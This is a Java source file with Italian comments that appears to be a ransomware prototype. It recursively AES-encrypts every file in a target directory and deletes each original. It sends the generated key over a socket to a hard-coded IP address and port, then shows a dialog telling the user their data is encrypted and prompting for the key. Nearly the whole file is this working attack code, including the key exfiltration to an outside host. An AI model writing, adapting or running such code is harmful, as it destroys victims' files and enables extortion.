package testCrittografias;

import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Scanner;


import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;

public class Crittografia {
	
	static void criptaFile(SecretKey chiavePrivata,File fileInput,File fileOutput) {
	
		try {
			//SecretKey chiavePrivata = generaChiave(chiave);
			System.out.println("Lughezza file non ancora criptato: "+fileInput.length());
			Cipher cipher = Cipher.getInstance("AES");
	        cipher.init(Cipher.ENCRYPT_MODE, chiavePrivata);
	     // Legge il contenuto del file di input
	        FileInputStream fileInputStream = new FileInputStream(fileInput);
	        byte[] inputBytes = new byte[(int) fileInput.length()];
	        fileInputStream.read(inputBytes);
	        fileInputStream.close();
	        
	        //cripta dati
	        byte[] outputBytes = cipher.doFinal(inputBytes);
	        
	        FileOutputStream fileOutputStream = new FileOutputStream(fileOutput);
	        fileInput.delete();
	        fileOutputStream.write(outputBytes);
	        fileOutputStream.close();
	        System.out.print("File "+ fileOutput.toString() +" criptato");
	        System.out.println("Lughezza file criptato: "+fileOutput.length());
	        
	        
	             
		}catch(Exception e) {
			System.out.println("Errore nella criptazione del file");
		}
	
	
	}

	static void criptaDirectory(SecretKey chiavePrivata, String pathDirectory) throws Exception{	
		try {
			//prende ogni singolo file e chiama il metodo per criptazrlo
			Files.walk(Paths.get(pathDirectory))
	        .filter(Files::isRegularFile)  // Considera solo i file
	        .forEach(filePath -> {
	            try {
	                criptaFile(chiavePrivata,new File(filePath.toString()),new File(filePath.toString()+".aes"));
	            } catch (Exception e) {
	                System.err.println("Errore criptando il file: " + filePath);
	                e.printStackTrace();
	            }
	        });
		}catch(Exception e) {
			System.out.println("Errore nella criptazione della directory");
		}
	}
	
	static SecretKey generaChiave (String chiave) throws Exception{
		byte[] byteChiave = chiave.getBytes();
		SecureRandom numeriGenerati = new SecureRandom(byteChiave);
		KeyGenerator generatoreChiave = KeyGenerator.getInstance("AES");
		generatoreChiave.init(128, numeriGenerati); // 128-bit AES

		//conversione chiave in stringa
		SecretKey chiaveGenerata = generatoreChiave.generateKey();
		String chiaveStringa = Base64.getEncoder().encodeToString(chiaveGenerata.getEncoded());
		//System.out.println("Chiave "+chiaveStringa);
		mandaDati(chiaveStringa);
		
		return chiaveGenerata;
	}
	
	static void mandaDati(String chiaveStringa) {
		String ip = "192.168.165.206";
		int porta = 5000;
		try {
			Socket socket = new Socket(ip,porta);
			DataOutputStream outputStream = new DataOutputStream(socket.getOutputStream());
			outputStream.writeUTF("Chiave di decriptazione :"+chiaveStringa );
			outputStream.close();
			socket.close();
		}catch(Exception e) {
			System.out.println("Errore connessione al server");
		}
	}	
	
	static void decriptaFile(SecretKey chiaveRiconvertita,File fileCriptato) {
		try {
			//SecretKey chiaveRiconvertita = new SecretKeySpec(Base64.getDecoder().decode(chiaveStringa), "AES");
			Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.DECRYPT_MODE, chiaveRiconvertita);
            
            FileInputStream fileInputStream = new FileInputStream(fileCriptato);
            byte[] inputBytes = new byte[(int) fileCriptato.length()];
            fileInputStream.read(inputBytes);
            fileInputStream.close();
            
            byte[] outputBytes = cipher.doFinal(inputBytes);
            
         
            //Sostituito con file decriptato
            FileOutputStream fileOutputStream = new FileOutputStream(new File(fileCriptato.toString()+" "));
            fileOutputStream.write(outputBytes);
            fileOutputStream.close();
            fileCriptato.delete();
            
            
		}catch(Exception e) {
			System.out.println("Errore nella decriptazione");
		}
	}
	
	static void decriptaDirectory(String pathDirectory) {
		try {
			String chiaveStringa = "";
			//Scanner scanner = new Scanner(System.in);
			//System.out.print("Inserisci password per la decriptazione: ");
			chiaveStringa = JOptionPane.showInputDialog("Inserisci la chiave di decriptazione");
			
			SecretKey chiave = new SecretKeySpec(Base64.getDecoder().decode(chiaveStringa), "AES");
			
			Files.walk(Paths.get(pathDirectory))
	        .filter(Files::isRegularFile)  // Considera solo i file
	        .forEach(filePath -> {
	            try {
	                decriptaFile(chiave,new File(filePath.toString()));
	                System.out.println("Decriptazione file "+filePath.toString());
	            } catch (Exception e) {
	                System.err.println("Errore criptando il file: " + filePath);
	                e.printStackTrace();
	            }
	        });
			
		}catch(Exception e) {
			System.out.println("Errore decriptazione directory");
		}
	}

	public static void main(String[] args) {
		String directory = "/home/fede/Desktop/Cartella";

		try {
			SecretKey chiave = generaChiave("ciao");
			criptaDirectory(chiave,directory);
			JOptionPane.showMessageDialog(null, "I tuoi dati sono stati criptati, Inserire la chiave per decriptarli");
			decriptaDirectory(directory);
		}catch(Exception e) {
			System.out.println("Errore");
		}
		
	}

}
